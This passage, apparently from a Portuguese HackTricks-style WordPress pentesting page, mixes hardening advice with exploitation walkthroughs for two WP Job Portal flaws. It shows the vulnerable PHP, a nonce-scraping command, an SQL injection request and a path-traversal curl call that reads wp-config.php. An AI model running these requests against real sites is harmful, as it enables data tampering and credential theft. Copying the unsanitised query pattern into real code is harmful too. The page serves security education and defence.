- Teste caminhos n√£o autenticados primeiro (AJAX `nopriv`, REST com permissive `permission_callback`, shortcodes p√∫blicos). Payloads padr√£o frequentemente t√™m sucesso sem obfusca√ß√£o.
- Casos t√≠picos de alto impacto: escalonamento de privil√©gios (controle de acesso quebrado), upload/download arbitr√°rio de arquivos, LFI, open redirect.

Notas defensivas

- N√£o confie em assinaturas de WAF gen√©ricas para proteger CVEs de plugins. Implemente patches virtuais espec√≠ficos da vulnerabilidade na camada de aplica√ß√£o ou atualize rapidamente.
- Prefira verifica√ß√µes de security positiva no c√≥digo (capabilities, nonces, valida√ß√£o estrita de entrada) em vez de filtros regex negativos.

## Prote√ß√£o do WordPress

### Atualiza√ß√µes regulares

Certifique-se de que o WordPress, plugins e temas estejam atualizados. Tamb√©m confirme que a atualiza√ß√£o autom√°tica est√° habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Al√©m disso, **instale apenas plugins e temas confi√°veis do WordPress**.

### Plugins de Seguran√ßa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomenda√ß√µes**

- Remova o usu√°rio padr√£o **admin**
- Use **senhas fortes** e **2FA**
- Revise periodicamente as **permiss√µes** dos **usu√°rios**
- **Limite as tentativas de login** para prevenir ataques Brute Force
- Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou de determinados endere√ßos IP.

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

O plugin de recrutamento WP Job Portal exp√¥s uma tarefa **savecategory** que, em √∫ltima inst√¢ncia, executa o seguinte c√≥digo vulner√°vel dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problems introduzidos por este snippet:

1. **Entrada do utilizador n√£o sanitizada** ‚Äì `parentid` vem diretamente da requisi√ß√£o HTTP.
2. **Concatena√ß√£o de strings dentro da cl√°usula WHERE** ‚Äì aus√™ncia de `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì embora a a√ß√£o seja executada atrav√©s de `admin-post.php`, a √∫nica verifica√ß√£o em vigor √© um **CSRF nonce** (`wp_verify_nonce()`), que qualquer visitante pode obter de uma p√°gina p√∫blica que incorpora o shortcode `[wpjobportal_my_resumes]`.

#### Explora√ß√£o

1. Obtenha um nonce novo:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitr√°rio abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da query injetada ou altera a base de dados, provando SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia a visitantes descarregar **qualquer arquivo no disco** via path traversal. O sink vulner√°vel est√° localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` √© controlado pelo atacante e concatenado **sem sanitiza√ß√£o**.  Novamente, a √∫nica barreira √© um **CSRF nonce** que pode ser obtido na p√°gina do curr√≠culo.

#### Explora√ß√£o
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conte√∫do de `wp-config.php`, leaking DB credentials and auth keys.

## Refer√™ncias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
